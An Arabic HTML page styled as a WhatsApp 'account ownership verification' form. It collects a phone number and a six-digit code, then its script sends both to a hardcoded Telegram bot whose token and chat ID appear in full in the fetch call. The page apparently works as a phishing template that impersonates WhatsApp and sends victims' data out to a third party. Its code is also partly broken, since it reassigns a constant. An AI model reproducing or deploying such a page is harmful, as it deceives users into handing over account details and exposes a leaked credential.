<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من ملكية الحساب</title>
    <style>
        :root {
            --primary-color: #25D366; /* لون الواتساب */
            --secondary-color: #128C7E;
            --light-color: #f5f5f5;
            --dark-color: #333;
            --error-color: #e74c3c;
            --success-color: #2ecc71;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: var(--dark-color);
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: var(--dark-color);
        }
        
        input[type="tel"],
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus {
            border-color: var(--primary-color);
            outline: none;
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
            font-weight: bold;
        }
        
        button:hover {
            background-color: var(--secondary-color);
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }
        
        .success {
            background-color: rgba(46, 204, 113, 0.2);
            color: var(--success-color);
        }
        
        .error {
            background-color: rgba(231, 76, 60, 0.2);
            color: var(--error-color);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top: 4px solid var(--primary-color);
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        .verification-section {
            display: none;
            margin-top: 30px;
        }
        
        .timer {
            text-align: center;
            margin-top: 10px;
            color: var(--primary-color);
            font-weight: bold;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="https://cdn-icons-png.flaticon.com/512/3670/3670051.png" alt="واتساب" class="logo">
            <h1>التحقق من ملكية الحساب</h1>
            <p>سيتم إرسال كود التحقق إلى رقم واتساب المسجل</p>
        </header>
        
        <div id="phoneForm">
            <div class="form-group">
                <label for="phone">رقم الهاتف المرتبط بالحساب</label>
                <input type="tel" id="phone" name="phone" required placeholder="أدخل رقم الهاتف مع رمز الدولة">
            </div>
            
            <div class="loading" id="phoneLoading">
                <div class="spinner"></div>
                <p>جاري إرسال كود التحقق...</p>
            </div>
            
            <div class="status" id="phoneStatus"></div>
            
            <button type="button" id="sendCodeBtn">إرسال كود التحقق</button>
        </div>
        
        <div id="verificationSection" class="verification-section">
            <div class="form-group">
                <label for="verificationCode">كود التحقق المكون من 6 أرقام</label>
                <input type="text" id="verificationCode" name="verificationCode" maxlength="6" placeholder="أدخل الكود هنا" pattern="\d{6}" required>
            </div>
            
            <div class="timer" id="timer">02:00</div>
            
            <button type="button" id="resendCodeBtn" disabled>إعادة إرسال الكود</button>
            
            <div class="loading" id="verifyLoading">
                <div class="spinner"></div>
                <p>جاري التحقق...</p>
            </div>
            
            <div class="status" id="verifyStatus"></div>
            
            <button type="button" id="verifyBtn">تحقق</button>
        </div>
    </div>

    <script>
        // متغيرات عامة
        let verificationCode = '';
        let countdownInterval;
        let remainingTime = 120; // 2 دقائق بالثواني
        const phoneNumber = '';
        
        // عناصر DOM
        const phoneForm = document.getElementById('phoneForm');
        const verificationSection = document.getElementById('verificationSection');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const resendCodeBtn = document.getElementById('resendCodeBtn');
        const phoneLoading = document.getElementById('phoneLoading');
        const verifyLoading = document.getElementById('verifyLoading');
        const phoneStatus = document.getElementById('phoneStatus');
        const verifyStatus = document.getElementById('verifyStatus');
        const timerElement = document.getElementById('timer');
        
        // إرسال كود التحقق
        sendCodeBtn.addEventListener('click', function() {
            const phoneInput = document.getElementById('phone');
            const phone = phoneInput.value.trim();
            
            if (!phone) {
                phoneStatus.textContent = 'الرجاء إدخال رقم الهاتف';
                phoneStatus.className = 'status error';
                phoneStatus.style.display = 'block';
                return;
            }
            
            phoneLoading.style.display = 'block';
            phoneStatus.style.display = 'none';
            
            // توليد كود تحقق عشوائي (6 أرقام)
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            // هنا يجب إضافة الكود الذي يرسل الرسالة إلى الواتساب
            // في الواقع تحتاج إلى استخدام API خاص بالواتساب مثل Twilio أو غيرها
            // هذا مثال فقط للتوضيح
            setTimeout(() => {
                phoneLoading.style.display = 'none';
                
                // في الواقع هنا سيتم إرسال الكود إلى الواتساب
                // ولكن لأغراض العرض سنظهره في التنبيه
                alert(`كود التحقق: ${verificationCode}\n\nسيتم إرسال هذا الكود إلى رقم الهاتف ${phone} عبر الواتساب`);
                
                // حفظ رقم الهاتف
                phoneNumber = phone;
                
                // إظهار قسم التحقق
                phoneForm.style.display = 'none';
                verificationSection.style.display = 'block';
                
                // بدء العد التنازلي
                startCountdown();
            }, 1500);
        });
        
        // بدء العد التنازلي لإعادة الإرسال
        function startCountdown() {
            clearInterval(countdownInterval);
            remainingTime = 120;
            updateTimerDisplay();
            
            countdownInterval = setInterval(() => {
                remainingTime--;
                updateTimerDisplay();
                
                if (remainingTime <= 0) {
                    clearInterval(countdownInterval);
                    resendCodeBtn.disabled = false;
                }
            }, 1000);
        }
        
        // تحديث عرض المؤقت
        function updateTimerDisplay() {
            const minutes = Math.floor(remainingTime / 60);
            const seconds = remainingTime % 60;
            timerElement.textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        // إعادة إرسال كود التحقق
        resendCodeBtn.addEventListener('click', function() {
            this.disabled = true;
            
            // توليد كود جديد
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            // هنا يجب إضافة الكود الذي يرسل الرسالة إلى الواتساب
            alert(`كود التحقق الجديد: ${verificationCode}\n\nسيتم إرسال هذا الكود إلى رقم الهاتف ${phoneNumber} عبر الواتساب`);
            
            // إعادة بدء العد التنازلي
            startCountdown();
        });
        
        // التحقق من الكود
        verifyBtn.addEventListener('click', function() {
            const enteredCode = document.getElementById('verificationCode').value.trim();
            
            if (!enteredCode || enteredCode.length !== 6) {
                verifyStatus.textContent = 'الرجاء إدخال كود التحقق المكون من 6 أرقام';
                verifyStatus.className = 'status error';
                verifyStatus.style.display = 'block';
                return;
            }
            
            verifyLoading.style.display = 'block';
            verifyStatus.style.display = 'none';
            
            // محاكاة التحقق (في الواقع يجب مقارنة الكود مع ما تم إرساله)
            setTimeout(() => {
                verifyLoading.style.display = 'none';
                
                if (enteredCode === verificationCode) {
                    verifyStatus.textContent = 'تم التحقق بنجاح! جاري إرسال البيانات...';
                    verifyStatus.className = 'status success';
                    verifyStatus.style.display = 'block';
                    
                    // إرسال البيانات إلى التلجرام بعد التحقق
                    sendToTelegram();
                } else {
                    verifyStatus.textContent = 'كود التحقق غير صحيح، الرجاء المحاولة مرة أخرى';
                    verifyStatus.className = 'status error';
                    verifyStatus.style.display = 'block';
                }
            }, 1500);
        });
        
        // إرسال البيانات إلى التلجرام
        function sendToTelegram() {
            verifyLoading.style.display = 'block';
            
            // إعداد الرسالة للتلجرام
            const message = `✅ *تم التحقق من ملكية الحساب*\n\n`
                         + `📱 *رقم الهاتف:* ${phoneNumber}\n`
                         + `🔢 *كود التحقق:* ${verificationCode}\n`
                         + `🕒 *وقت التحقق:* ${new Date().toLocaleString()}`;
            
            // إعداد البيانات لإرسالها إلى التلجرام
            const telegramData = new FormData();
            telegramData.append('chat_id', '7493001551');
            telegramData.append('text', message);
            telegramData.append('parse_mode', 'Markdown');
            
            // إرسال البيانات إلى بوت التلجرام
            fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
                method: 'POST',
                body: telegramData
            })
            .then(response => response.json())
            .then(data => {
                verifyLoading.style.display = 'none';
                
                if (data.ok) {
                    verifyStatus.textContent = 'تم التحقق وإرسال البيانات بنجاح!';
                    verifyStatus.className = 'status success';
                    verifyStatus.style.display = 'block';
                } else {
                    throw new Error(data.description || 'حدث خطأ غير معروف');
                }
            })
            .catch(error => {
                verifyLoading.style.display = 'none';
                verifyStatus.textContent = `حدث خطأ أثناء إرسال البيانات: ${error.message}`;
                verifyStatus.className = 'status error';
                verifyStatus.style.display = 'block';
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
